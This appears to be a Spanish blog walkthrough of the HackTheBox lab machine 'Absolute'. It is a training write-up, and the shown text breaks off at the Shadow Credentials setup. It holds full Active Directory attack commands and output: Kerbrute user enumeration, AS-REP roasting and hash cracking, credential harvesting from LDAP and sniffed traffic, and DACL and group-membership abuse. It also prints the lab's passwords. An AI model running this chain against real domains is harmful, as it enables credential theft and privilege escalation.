---
layout: post
title: "HTB - Absolute"
author: "xD4z"
categories: hackthebox
tags: [windows, active directory, keberos, krbrelay, crackmapexec, ldapsearch]
image: htb/absolute/absolute.png
cover: htb/absolute/absolute.png
---

Absolute es una máquina dificil que se centra principalmente en la enumeración y obtención de credenciales hasta lograr obtener una shell en el sistema. En este proceso, realizaremos ataques comunes como el AS-REP Roasting, contraseñas en texto plano y también utilizaremos Wireshark para realizar análisis dinámico.

Con Bloodhound enumeraremos información del dominio en busca de posibles rutas de ataque, aprovecharemos permisos que nos permiten añadir Shadow Credentials a un usuario que puede obtener acceso remoto al sistema. Además, haremos uso de Kerberos Relay para añadir nuestro usuario actual al grupo de Administradores. Finalmente, aprenderemos cómo mitigar este tipo de ataques.

| Plataforma | HackTheBox
| Dificultad | Insane
| Sistema Operativo | Windows

# Reconocimiento
## Ping
Comenzamos enviando un ping para comprobar que tenemos conectividad con la máquina y tratar de adivinar el sistema operativo
```bash
$ ping -c 1 10.129.228.64
PING 10.129.228.64 (10.129.228.64) 56(84) bytes of data.
64 bytes from 10.129.228.64: icmp_seq=1 ttl=127 time=39.8 ms

--- 10.129.228.64 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 39.804/39.804/39.804/0.000 ms
```

Dado que el ttl es igual 127, podemos pensar que estamos ante una máquina Windows

## Nmap
Vamos a usar nmap para escanear los puertos TCP, guardando la salida en el fichero scan
```bash
$ nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oN recon/scan 10.129.228.64
Nmap scan report for 10.129.228.64
Host is up, received user-set (0.032s latency).
Scanned at 2023-05-30 18:48:00 CEST for 13s
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49439/tcp open  unknown          syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127
49702/tcp open  unknown          syn-ack ttl 127
```

Con la utilidad [extractports](https://github.com/xD4z/pentools/blob/main/extractports), copiamos los puertos a la clipboard
```bash
$ extractports recon/scan

  [*] Extrayendo puertos...

	[+] Dirección IP: 10.129.228.64
	[+] Puertos Abiertos: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49439,49664,49665,49666,49667,49673,49674,49675,49683,49695,49698,49702

  [*] Puertos copiados a la Clipboard
```

Y realizamos un escaneo básico para identificar servicios y versiones, excluyendo aquellos superiores a 49152 comúnmente utilizados por aplicaciones que implementan el protocolo RPC
```bash
$ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oN recon/detections 10.129.228.64
Nmap scan report for 10.129.228.64
Host is up (0.034s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Absolute
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-30 23:52:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-30T23:53:17+00:00; +7h00m05s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-30T23:53:17+00:00; +7h00m06s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-30T23:53:17+00:00; +7h00m05s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-30T23:53:17+00:00; +7h00m06s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m05s, deviation: 0s, median: 7h00m05s
| smb2-time: 
|   date: 2023-05-30T23:53:11
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

Dado la [versión del IIS](https://es.wikipedia.org/wiki/Internet_Information_Services#Versiones), y los puertos 53 (DNS), 88 (Kerberos), 389/636 (LDAP) y 445 (SMB) comúnes a un controlador de dominio, podemos intuir que estamos ante un Windows Server 2019

A través de LDAP, vemos que el dominio es `absolute.htb` y el nombre de la máquina es `dc.absolute.htb`

Agregamos ambas al /etc/hosts
```bash
$ echo "10.129.228.64 dc.absolute.htb dc absolute.htb" | sudo tee -a /etc/hosts
```

## Web - TCP 80
Navegando a la `10.129.228.64`, como `absolute.htb` y `dc.absolute.ip` llevan a la misma web, por lo que intuimos que no se está aplicando virtual hosting

![](assets/img/htb/absolute/1.png)

Lo único destacable de esta página web son las imágenes, por lo que procedemos a descargarlas
![](assets/img/htb/absolute/2.png)

En  vez de descargalo uno a uno, vamos a hacer uso de wget y un bucle for in en bash
```bash
$ for i in {1..6}; do wget http://absolute.htb/images/hero_$i.jpg; done
```

Vemos que en la primera imagen hay un campo Author, que nos será de utilidad para tratar de obtener usuarios válidos
```bash
$ exiftool hero_1.jpg
ExifTool Version Number         : 12.16
File Name                       : hero_1.jpg
Directory                       : .
[...]
Author                          : James Roberts
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
[...]
```

# Credenciales de d.klay 
## AS-REP Roast Attack
Un ataque AS-REP Roast de Kerberos, ocurre cuando una cuenta tiene habilitada la opción `Do not require Kerberos Authentication` . Haciendo uso de la herramienta GetNPUsers de Impacket, obtendremos un hash de Kerberos 5 sin pre-autenticación (también conocido como hash AS-REP), que deriva de la contraseña del usuario, por lo que podremos tratar de hacer un ataque de diccionario y obtener la contraseña si esta es débil o adivinable

Para realizar este ataque, primero tenemos que obtener usuarios válidos y después ejecutar el ataque con GetNPUsers

### Creando la lista de usuarios
Con un oneliner extraemos los nombres de las imágenes
```bash
$ exiftool hero_*  | grep Author | awk '{print $3 " " $4}' | tee author_names
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith
```

En vez de tratar de adivinar los nombres de usuarios, vamos a hacer uso de la herramienta [username-anarchy](https://github.com/urbanadventurer/username-anarchy) que los crea por nosotros
```bash
$ username-anarchy/username-anarchy -i author_names | tee anarchy_users
james
jamesroberts
james.roberts
jamesrob
jamerobe
jamesr
j.roberts
jroberts
[...]
```

### Kerbrute
Para enumerar usuarios válidos, [Kerbrute](https://github.com/ropnop/kerbrute) envía una petición TGT sin pre-autenticación. Si la respuesta del KDC es `PRINCIPAL UNKNOWN`, el usuario es descartado. Sin embargo, si el KDC solicita autenticación previa, el usuario es considerado válido. Esto genera un evento en Windows con ID [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768), si los logs de Kerberos se encuentran habilitados. - [Fuente](https://github.com/ropnop/kerbrute#user-enumeration)
```bash
$ kerbrute userenum --dc dc.absolute.htb -d absolute.htb username-anarchy

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/31/23 - Ronnie Flathers @ropnop

2023/05/31 05:47:12 >  Using KDC(s):
2023/05/31 05:47:12 >  	dc.absolute.htb:88

2023/05/31 05:47:12 >  [+] VALID USERNAME:	j.roberts@absolute.htb
2023/05/31 05:47:12 >  [+] VALID USERNAME:	m.chaffrey@absolute.htb
2023/05/31 05:47:12 >  [+] VALID USERNAME:	s.osvald@absolute.htb
2023/05/31 05:47:12 >  [+] VALID USERNAME:	d.klay@absolute.htb
2023/05/31 05:47:12 >  [+] VALID USERNAME:	j.robinson@absolute.htb
2023/05/31 05:47:12 >  [+] VALID USERNAME:	n.smith@absolute.htb
2023/05/31 05:47:12 >  Done! Tested 88 usernames (6 valid) in 0.297 seconds
```

Extraemos los usuarios y los guardamos en el fichero users
```bash
$ kerbrute userenum --dc dc.absolute.htb -d absolute.htb anarchy_users | awk 'NF {print $NF}' | grep -oP '.+@' | tr -d @ | tee users
```

### GetNPUsers
Ahora que ya tenemos los usuarios válidos, lanzamos el ataque AS-REP Roast con la utilidad GetNPUsers.py de [Impacket](https://github.com/fortra/impacket)
```bash
$ GetNPUsers.py absolute.htb/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$d.klay@ABSOLUTE.HTB:87ef2d6e22c4d9b1a8a817d40573c266$678f93c32a55827a6d7cf46440dce9105ee90c3b4feb281060b3bee139a9d5e8f19b14f7d2bdc67a35f86c622d12bb1ce7d89ef5c6a3c7107878e787c91d6a0d860b42ab551abdc1a7eecea4be74fa24c5ecce71683e0da33f4ea14e3fe9bb6388c9caafb3b450ee5363ed950795c9566f1e7d07203247a8744fde29b760f5dc59c6c7c2f30e30400827e5ebc70c3a68f3a2f66c550be32d38d5f5796f8542a19c4c53371550ba94b706b48b077a741fb651152117072ced547a4d6a4f7c20c1f05eb73700c5f3fb7fbf663849285aa37fbfda144862a59feca9f94adda01165238f2255aab59ee81d660ecc
[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

El usuario d.klay es AS-REP Roasteable, así que guardame el hash anterior y lo crackeamos con hashcat
```bash
$ hashcat -m 18200 d.klay-krb5asrep /usr/share/wordlists/rockyou.txt
[...]
$krb5asrep$23$d.klay@ABSOLUTE.HTB:87ef2d6e22c4d9b1a8a817d40573c266$[...]:Darkmoonsky248girl
[..]
```

La contraseña del usuario d.klay es Darkmoonsky248girl, lo validamos con crackmapexec
```bash
$ crackmapexec smb 10.129.228.64 -u d.klay -p  Darkmoonsky248girl
SMB         10.129.228.64   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.64   445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
```

Al ejecutar el comando anterior, nos devuelve el mensaje STATUS_ACCOUNT_RESTRICTION que suele ser indicador de que la autenticación por NTLML está deshabilitada y tenemos que hacer uso de Kerberos

crackmapexec tiene la opción `-k` para usar Kerberos
```bash
$ crackmapexec smb 10.129.228.64 -u d.klay -p  Darkmoonsky248girl -k
SMB         10.129.228.64   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.64    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl KRB_AP_ERR_SKEW
```

Si nos devuelve el error `KRB_AP_ERR_SKEW`, es por que tenemos que sincronizar el reloj con el KDC. Para ello, podemos ver tanto la salida del comando nmap al puerto 88 de Kerberos, donde nos indicaba la hora, o a través del protocolo NTP
```bash
$ sudo nmap -sU -p 10.129.228.64
PORT    STATE SERVICE
123/udp open  ntp
```

Sincronizamos con el comando ntpdate
```bash
$ sudo ntpdate 10.129.228.64
```

Ahora ya podemos autenticarnos contra el KDC exitósamente y enumerar recursos compartidos
```bash
$ crackmapexec smb 10.129.228.64 -u d.klay -p  Darkmoonsky248girl -k
SMB         10.129.228.64    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.64    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 

$ crackmapexec smb 10.129.228.64 -u d.klay -p  Darkmoonsky248girl -k --shares
SMB         10.129.228.64    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.64    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
SMB         10.129.228.64    445    DC               [+] Enumerated shares
SMB         10.129.228.64    445    DC               Share           Permissions     Remark
SMB         10.129.228.64    445    DC               -----           -----------     ------
SMB         10.129.228.64    445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.64    445    DC               C$                              Default share
SMB         10.129.228.64    445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.64    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.228.64    445    DC               Shared                          
SMB         10.129.228.64    445    DC               SYSVOL          READ            Logon server share 
```

Sin embargo, que una herramienta acepte autenticación por Kerberos es la excepción y no la norma, es por ello que posteriormente haremos uso de la herramienta kinit y getTGT para obtener TGTs

# Credenciales de smb_svc
### Enumeración por LDAP 
crackmapexec nos permite enumerar usuarios por LDAP
```bash
$ crackmapexec ldap 10.129.228.64 -u d.klay -p  Darkmoonsky248girl -k --users
SMB         10.129.228.64   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.129.228.64   389    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
LDAP        10.129.228.64   389    DC               [*] Total of records returned 20
LDAP        10.129.228.64   389    DC               Administrator                  Built-in account for administering the computer/domain
LDAP        10.129.228.64   389    DC               Guest                          Built-in account for guest access to the computer/domain
LDAP        10.129.228.64   389    DC               krbtgt                         Key Distribution Center Service Account
LDAP        10.129.228.64   389    DC               J.Roberts                      
LDAP        10.129.228.64   389    DC               M.Chaffrey                     
LDAP        10.129.228.64   389    DC               D.Klay                         
LDAP        10.129.228.64   389    DC               s.osvald                       
LDAP        10.129.228.64   389    DC               j.robinson                     
LDAP        10.129.228.64   389    DC               n.smith                        
LDAP        10.129.228.64   389    DC               m.lovegod                      
LDAP        10.129.228.64   389    DC               l.moore                        
LDAP        10.129.228.64   389    DC               c.colt                         
LDAP        10.129.228.64   389    DC               s.johnson                      
LDAP        10.129.228.64   389    DC               d.lemm                         
LDAP        10.129.228.64   389    DC               svc_smb                        AbsoluteSMBService123!
LDAP        10.129.228.64   389    DC               svc_audit                      
LDAP        10.129.228.64   389    DC               winrm_user                     Used to perform simple network tasks
```

Además de los nombres de usuarios del dominio, nos muestra el campo `Description`, infame por ser lugar donde Administradores guardan contraseñas al pensar que no son visibles por los demás usuarios

En este caso, vemos lo que parece una contraseña `AbsoluteSMBService123!` para el usuario svc_smb
```bash
$ crackmapexec smb 10.129.228.64 -u svc_smb -p AbsoluteSMBService123! -k
SMB         10.129.228.64   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.64   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123!
```

## ldapsearch
Como alternativa y enumerar información adicional que no nos muestra crackmapexec, podemos hacer uso de ldapsearhc. Para ello, vamos a tener que generar un TGT para el usuario d.klay

Para poder obtener TGTs que hará uso ldapsearch, u otros comandos como net, que usaremos más tarde para añadir usuarios a grupos por kerberos, debemos instalar [krb5-user](https://computing.help.inf.ed.ac.uk/kerberos-ubuntu)
```bash
sudo apt-get install krb5-user
```

De modo que el fichero `/etc/krb5.conf` se vea de la siguiente forma
```bash
cat /etc/krb5.conf
[libdefaults]
    default_realm = ABSOLUTE.HTB

[realms]
    ABSOLUTE.HTB = {
        kdc = dc.absolute.htb
    }

[domain_realm]
    .absolute.htb = ABSOLUTE.HTB
    absolute.htb = ABSOLUTE.HTB
```

Obtenemos el TGT y listamos los Tickets obtenidos
```bash
$ echo 'Darkmoonsky248girl' | kinit d.klay
Password for d.klay@ABSOLUTE.HTB: 

$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: d.klay@ABSOLUTE.HTB

Valid starting     Expires            Service principal
03/06/23 00:45:08  03/06/23 04:45:08  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
	renew until 03/06/23 04:45:08

```

Además, para autenticarnos haciendo uso del mecanismo de autenticación GSSAPI necesario por ldapsearch, necesitamos el paquete `libsasl2-modules-gssapi-mit`
```bash
$ sudo apt install libsasl2-modules-gssapi-mit
```

Algo importante a tener en cuenta, es que el nombre del DC, `dc.absolute.htb`, tiene que ir primero en el `/etc/hosts`. En caso contrario devolverá el siguiente error
```bash
ldapsearch -H ldap://dc.absolute.htb -b "dc=absolute,dc=htb"
SASL/GSSAPI authentication started
ldap_sasl_interactive_bind: Local error (-2)
	additional info: SASL(-1): generic failure: GSSAPI Error: Unspecified GSS failure.  Minor code may provide more information (Server not found in Kerberos database)
```

Configuración correcta del `/etc/hosts` :
```bash
$ tail -n 1 /etc/hosts
10.129.228.64 dc.absolute.htb absolute.htb dc
```

Volvemos a ejecutar, y filtramos por la contraseña del usuario `svc_smb` 
```bash
$ ldapsearch -H ldap://dc.absolute.htb -b "dc=absolute,dc=htb" 2>/dev/null | grep 'AbsoluteSMBService123!'
description: AbsoluteSMBService123!
```

## SMB
A diferencia de d.klay, el usuario svc_smb tiene capacidad de lectura en el directorio `Shared`
```bash
$ crackmapexec smb 10.129.228.64 -u svc_smb -p AbsoluteSMBService123! -k --shares
SMB         10.129.228.64   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.64   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
SMB         10.129.228.64   445    DC               [+] Enumerated shares
SMB         10.129.228.64   445    DC               Share           Permissions     Remark
SMB         10.129.228.64   445    DC               -----           -----------     ------
SMB         10.129.228.64   445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.64   445    DC               C$                              Default share
SMB         10.129.228.64   445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.64   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.228.64   445    DC               Shared          READ            
SMB         10.129.228.64   445    DC               SYSVOL          READ            Logon server share 
```

Nos conectamos con smbclient.py de Impacket, que no smbclient. En el directorio se encuentran 2 archivos, lo descargamos para realizar su posterior el análisis
```bash
$ smbclient.py 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
Type help for list of commands
# use shared
# ls
drw-rw-rw-          0  Thu Sep  1 19:02:23 2022 .
drw-rw-rw-          0  Thu Sep  1 19:02:23 2022 ..
-rw-rw-rw-         72  Thu Sep  1 19:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Thu Sep  1 19:02:23 2022 test.exe
# mget *
[*] Downloading compiler.sh
[*] Downloading test.exe
```
# Credeciales de m.lovegod 
### Análisis dinámico
El archivo compiler.sh tan solo contiene una línea que realiza la compilación de un programa en nim pasado como primer argumento
```bash
$ cat compiler.sh
#!/bin/bash

nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip $1
```

El segundo es un ejecutable portable para Windows de 64 bits
```bash
$ file test.exe
test.exe: PE32+ executable (GUI) x86-64 (stripped to external PDB), for MS Windows
```
Sabiendo esto, vamos a realizar el análisis del programa en una máquina virtual Windows 10

Ejecutando directamente desde la terminal parece no hacer nada
![](assets/img/htb/absolute/3.png)

Vamos a realizar un análisis dinámico escuchando el tráfico de red. Lo primero de todo, vamos a conectarnos a la VPN desde nuestra máquina Windows por si realiza alguna comunicación el DC y Wireshark para analizar el tráfico. Comprobamos la conectividad
![](assets/img/htb/absolute/4.png)

Volvemos a ejecutar el programa, pero esta vez con Wireshark escuchando tráfico por la interfaz de la VPN. Observamos que hay tráfico de red
![](assets/img/htb/absolute/5.png)

> Nota!
Como en la máquina virtual de Windows 10 tengo configurado la Red como NAT, mi equipo host hace de enrutrador y servidor DNS, por lo que resuelve las peticiones de dc.absolute.htb y no he tenido que configurar el DNS hacia el controlador de dominio

![](assets/img/htb/absolute/6.png)

Si veis que no os resuelve la consulta DNS, como se ve en la imagen anterior, primero tenéis que configurar el DC como servidor DNS, ya que recordemos que tenía el puerto 53 abierto

Vamos a conexiones de Red y hacemos click derecho en la interfaz de la VPN
![](assets/img/htb/absolute/7.png)

Doble click en "Protocolo de Internet versión 4 (TCP/IPv4)"
![](assets/img/htb/absolute/8.png)

Y configuramos la IP del DC como servidor DNS
![](assets/img/htb/absolute/9.png)

Una vez hecho, ejecutamos de nuevo y vemos que tanto la consulta DNS, como la autenticación por LDAP
![](assets/img/htb/absolute/10.png)

Analizando el tráfico, nos damos cuenta de que está intentando realizar una autenticación simple, enviando las credenciales en texto plano a través del protocolo LDAP para el usuario `mlovegod` con la contraseña `AbsoluteLDAP2022!.` Sin embargo, el servidor responde con un mensaje de invalidCredentials. Si intentamos conectarnos con Kerberos, vemos que nos responde con KDC_ERR_C_PRINCIPAL_UNKNOWN, que nos dice que el usuario no existe
```bash
$ crackmapexec smb 10.129.228.64 -u mlovegod -p AbsoluteLDAP2022! -k
SMB         10.129.228.64   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.64   445    DC               [-] absolute.htb\mlovegod:AbsoluteLDAP2022! KDC_ERR_C_PRINCIPAL_UNKNOWN 
```

 Anteriormente habíamos ejecutado crackmapexec para enumerar usuarios del dominio con las credenciales de d.klay y nos damos cuenta que efectivamente, no hay un usuario llamado mlovegood, pero si m.lovegod
```bash
LDAP        10.129.228.64   389    DC               m.lovegod 
```

Ejecutamos de nuevo el comando, pero con el usuario válido y verificamos las credenciales
```bash
$ crackmapexec smb 10.129.228.64 -u m.lovegod -p AbsoluteLDAP2022! -k
SMB         10.129.228.64   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.64   445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
```


# Shell - WinRM_USER
## Bloodhound Analysis
Podemos a usar cualquiera de las credenciales de los 3 usuarios obtenidos anteriormente para obtener información del dominio, y ver si podemos escalar nuestros privilegios a partir de alguno de ellos

Primero inciamos Bloodhound e introducimos las credenciales de neo4j. Puedes ver la guia de instalación [aquí](https://bloodhound.readthedocs.io/en/latest/installation/linux.html)
![](assets/img/htb/absolute/11.png)

A continuación, vamos a hacer uso de [Bloodhound.py](https://github.com/fox-it/BloodHound.py) para obtener información del directorio desde nuestra máquina atacante, ya que no tenemos acceso remoto a un host del dominio para ejecutar SharpHound
```bash
$ ./bloodhound.py -u m.lovegod -p 'AbsoluteLDAP2022!' -k -d absolute.htb -dc dc.absolute.htb -ns 10.129.228.64 -c ALL --zip
INFO: Found AD domain: absolute.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done in 00M 08S
INFO: Compressing output into 20230531234029_bloodhound.zip
```

Arrastramos el comprimido `20230531234029_bloodhound.zip` a la interfaz de Bloodhound para que extraiga la información
![](assets/img/htb/absolute/12.png)

En primer lugar vamos a ver a que grupos pertenece cada usuario del que hemos obtenido las credenciales y marcarlos como comprometidos haciendo clic derecho en el icono y clicando en `Mark user as Owned`

Observamos que los tres usuarios pertenecen al grupo `PROTECTED USERS`, el cual deshabilita la autenticación NTLM para sus miembros
![](assets/img/htb/absolute/13.png)
![](assets/img/htb/absolute/14.png)
![](assets/img/htb/absolute/15.png)
## Ruta de Ataque
Ahora nos vamos a `Analysis` y clicamos en `Shortest Path from Owned Principal`, d.klay y svc_smb no devuelven ninguna información, salvo m.lovegod
![](assets/img/htb/absolute/16.png)

Vamos a analizar como realizar movimiento lateral, del usuario m.lovegod al usuario WINRM_USER, que puede conectarse remotamente al DC

Para ver la ayuda o explicación de Bloodhound, hacemos clic derecho en el permiso, y a continuación en `help`
![](assets/img/htb/absolute/17.png)

m.lovegod es dueño del grupo Network Audit, por lo que puede modificar los descriptores de seguridad y obtener control total sobre él y posteriormente nuevos añadir usuarios al grupo
![](assets/img/htb/absolute/18.png)

Network Audit tiene el permiso GenericWrite sobre WINRM_USER, permite a sus miembros cambiar atributos del objeto, así como añadir Shadow Credentials
![](assets/img/htb/absolute/19.png)

### dacledit - Añadiendo a m.lovegod al grupo Network Audit
Si nos vamos a la pestaña `Linux Abuse`, vemos que nos habla de la utlidad [dacledit.py](https://github.com/ShutdownRepo/impacket/tree/dacledit), este se refiere a una utilidad de un fork de Impacket que nos permite modificar el descriptor de seguridad del objeto y otorgar nuevos privilegios a usuarios 
![](assets/img/htb/absolute/20.png)

Nos clonamos el repositorio, especificando la rama dacledit
```bash
$ git clone https://github.com/ShutdownRepo/impacket -b dacledit
Cloning into 'impacket'...
remote: Enumerating objects: 22819, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 22819 (delta 6), reused 9 (delta 6), pack-reused 22807
Receiving objects: 100% (22819/22819), 8.07 MiB | 10.10 MiB/s, done.
Resolving deltas: 100% (17414/17414), done.
```

Nos movemos al directorio y creamos un entorno virtual para instalar las dependencias sin que entre en conflicto con los paquetes ya instalados en el sistema
```bash
$ cd impacket
$ python3 -m venv venv
$ source venv/bin/activate
$ pip3 install .
```

Para hacer uso de dacledit tenemos que obtener un TGT de m.lovegod
```bash
$ getTGT.py absolute.htb/m.lovegod:'AbsoluteLDAP2022!'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in m.lovegod.ccache
```

Modificamos el DACL del grupo `NETWORK AUDIT` para obtener control total sobre él
```bash
$ KRB5CCNAME=m.lovegod.ccache dacledit.py -action 'write' -rights 'FullControl' -principal 'm.lovegod' -target 'NETWORK AUDIT' 'absolute.htb'/'m.lovegod':'AbsoluteLDAP2022!' -dc-ip 10.129.228.64  -k
Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230601-082802.bak
[*] DACL modified successfully!
```

Añadimos el usuario al grupo
```bash
$ net rpc group addmem "Network Audit" "m.lovegod" -U "absolute.htb"/"m.lovegod"%'AbsoluteLDAP2022!' -S "dc.absolute.htb" --use-kerberos=required

$ net rpc group members "Network Audit" -U absolute.htb/m.lovegod%'AbsoluteLDAP2022!' -S dc.absolute.htb --use-kerberos=required
absolute\m.lovegod
absolute\svc_audit
```

### Certipy - Añadiendo Shadow Credentials
Cuando obtenemos un TGT, este contiene información sobre los grupos a los que pertenece el usuario en el momento en que se emitió, como hemos añadido a m.lovegod a un nuevo grupo tenemos que obtener de nuevo un TGT con los datos actualizados

Obtenemos un nuevo ticket TGT con el nuevo grupo
```bash
$ getTGT.py absolute.htb/m.lovegod:'AbsoluteLDAP2022!'
Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Saving ticket in m.lovegod.ccache
```

> Certipy es una biblioteca de Python para la gestión de certificados en entornos Windows, mientras que las Shadow Credentials son un mecanismo de seguridad utilizado en Kerberos para proteger las credenciales de los usuarios almacenándolas de forma cifrada.

```bash
$ pip3 install certipy-ad
```

